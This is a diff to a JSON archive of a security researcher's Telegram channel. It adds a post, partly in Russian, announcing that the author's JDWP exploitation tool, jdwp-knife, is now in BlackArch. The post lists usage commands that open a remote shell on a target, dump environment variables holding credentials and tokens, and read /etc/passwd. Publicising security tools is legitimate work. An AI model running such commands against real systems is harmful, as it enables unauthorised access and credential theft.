@@ -1,8 +1,15 @@
 {
   "channel": "s0ld13r_ch",
-  "last_update": "2026-04-02T10:06:05.789925+00:00",
-  "messages_count": 66,
+  "last_update": "2026-04-02T15:03:50.884267+00:00",
+  "messages_count": 67,
   "messages": [
+    {
+      "id": "370",
+      "title": "jdwp-knife now is in BlackArch repository 👩‍💻",
+      "text": "jdwp-knife now is in BlackArch repository 👩‍💻\nМой инструмент для эксплуатации протокола JDWP теперь официально доступен в репозиториях дистрибутива BlackArch Linux 👩‍💻\nInstallation:\nsudo pacman -S jdwp-knife\nUsage:\n# Pseudo-interactive shell (cd, ls, cat, whoami — like SSH)\njdwp-knife -t TARGET -p 5005 --shell\n# Dump environment variables (credentials, tokens, connection strings)\njdwp-knife -t TARGET -p 5005 --env\n# Read file\njdwp-knife -t TARGET -p 5005 --cat /etc/passwd\n💻 PR:  https://github.com/BlackArch/blackarch/pull/4899\n🧢 s0ld13r\n\n[Media: Фото]",
+      "link": "https://t.me/s0ld13r_ch/370",
+      "pub_date": "2026-04-02T11:21:01+00:00"
+    },
     {
       "id": "368",
       "title": "Massive axios supply chain campaign 👩‍💻",
